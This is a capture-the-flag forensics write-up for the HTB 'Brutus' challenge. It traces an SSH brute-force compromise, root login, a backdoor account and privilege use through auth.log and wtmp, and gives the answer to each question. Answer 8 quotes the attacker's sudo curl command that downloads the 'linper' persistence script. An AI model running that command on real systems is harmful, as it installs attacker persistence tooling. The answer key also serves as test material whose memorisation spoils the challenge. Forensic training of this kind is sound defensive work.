# HTB Brutus
---
![htb logo](./Images/htb_logo.png)

| Date       | Author          | Difficulty | Challenge Type |
| ---------- | --------------- | ---------- | -------------- |
| 2025-08-31 | Andrew McKenzie | Very Easy  | DFIR           |

---
## Description
This challenge, Brutus, immerses the analyst in a digital forensics investigation of a compromised Confluence server. The primary focus is on analyzing Unix/Linux authentication logs (`auth.log` and `wtmp`) to trace the attacker's activities, from the initial brute-force SSH attack to post-compromise actions like privilege escalation and establishing persistence.
## Scenario
In this very easy Sherlock, you will familiarize yourself with Unix auth.log and wtmp logs. We'll explore a scenario where a Confluence server was brute-forced via its SSH service. After gaining access to the server, the attacker performed additional activities, which we can track using auth.log. Although auth.log is primarily used for brute-force analysis, we will delve into the full potential of this artifact in our investigation, including aspects of privilege escalation, persistence, and even some visibility into command execution.
## Artifacts Provided
- Brutus.zip
	- auth.log
	- utmp.py
	- wtmp

| Filename | Algorithm | Hash                                                             |
| -------- | --------- | ---------------------------------------------------------------- |
| auth.log | SHA256    | 66bdba9ff1688766876deadc19ab5ddb2b0bce6a638bf255586a863260f58b9e |
| auth.log | SHA1      | a05b38ac3814e018d19a71c0a01b23a372e1457b                         |
| auth.log | MD5       | 97506c51ff4174f721c6f50d3cdb9a92                                 |
| utmp.py  | SHA256    | 561f0d4e696f939d6f1ae72e7b072597811612fa1a63302ace3d17d5ca3004ce |
| utmp.py  | SHA1      | cb50a2e7d074be4cef539b862ae9e6ef9640b791                         |
| utmp.py  | MD5       | a27c3cab74044634fee4cc82542cba41                                 |
| wtmp     | SHA256    | dddc32ea65ed9972b0ee9802f95b20d4b6b98c0d5b4930f6d2302f2740458576 |
| wtmp     | SHA1      | 36a1a0de8b1fdf1bde6d15854aefb5d86c3e91e8                         |
| wtmp     | MD5       | c075bb3111080619e0fd9b269f13c910                                 |

## Skills Learned
- Parsing and analyzing Linux `auth.log` for security events.
- Identifying brute-force attacks and the source IP address.
- Pinpointing successful and failed authentication attempts.
- Using Python scripts to parse binary log files like `wtmp`.
- Correlating event data across different log sources (`auth.log` and `wtmp`).
- Investigating post-compromise activities, including user creation and privilege escalation.
- Tracking command execution through `sudo` log entries.
- Mapping attacker TTPs (Tactics, Techniques, and Procedures) to the MITRE ATT&CK framework.
- Utilizing essential command-line tools (`grep`, `cat`, `less`) for log analysis.
## Initial Analysis
The investigation begins with the provided `Brutus.zip` archive. After extraction, we are presented with three key artifacts: `auth.log`, `wtmp`, and a Python parser `utmp.py`.
- **`auth.log`**: A plaintext log file containing records of user logins, authentication attempts, and authorization-related events. This is the primary source for initial review due to its human-readable format.
- **`wtmp`**: A binary file that maintains a historical record of all user logins and logouts. This file requires a specialized parser to be read.
- **`utmp.py`**: A Python script provided to parse the binary `wtmp` file and convert its contents into a readable format.
The initial strategy is to examine `auth.log` to understand the timeline of the attack. We can start by looking for common indicators of a brute-force attack, such as a high volume of failed login attempts from a single IP address in a short period.
## Questions:
1. **Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?**
Piping the logs to less, we can go through the entries without being overwhelmed by the logs. As we start to move down from the initial lines, we can see “invalid user” messages coming in multiple times from a specific IP address: `65.2.161.68`

![image one](./Images/Pasted%20image%2020250831094941.png)

2. **The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?**
Continuing through the logs, we see many usernames/passwords were attempted. But, eventually we find a successful login for `root`.

![image two](./Images/Pasted%20image%2020250831095144.png)

3. **Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives. The login time will be different than the authentication time, and can be found in the wtmp artifact.**
We have been provided with a Python file for reading the WTMP artifacts. Using this and grepping for the IP address we found in question 1, we find the UTC time to be `2024-03-06 06:32:45`.

![image three](./Images/Pasted%20image%2020250831100736.png)

4. **SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**
Back to the auth logs, we can scroll down until closer to this previous question's time frame. From there we can see the login and the session `37` getting assigned.

![image four](./Images/Pasted%20image%2020250831101142.png)

5. **The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**
Using the auth logs, we can scroll down shortly after the initial successful login, and we find a new user being added: `cyberjunkie`.

![image five](./Images/Pasted%20image%2020250831134655.png)

6. **What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**
A quick Google search for this question provides a direct [link](https://attack.mitre.org/techniques/T1136/). This technique has three sub-techniques: local, domain, and cloud. Based on this challenge, we assume a local account: `T1136.001`.

![image six](./Images/Pasted%20image%2020250831134824.png)

7. **What time did the attacker's first SSH session end according to auth.log?**
Running the command `cat auth.log | grep "37"`, we can see at the end of the output that session 37 logged out at `2024-03-06 06:37:24`.

![image seven](./Images/Pasted%20image%2020250831135035.png)

8. **The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**
Running the command `cat auth.log | grep "cyberjunkie"`, we can review logs specific to this user's activity. We can see that the user performed a few commands, but the command in question is: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`.

![image eight](./Images/Pasted%20image%2020250831135231.png)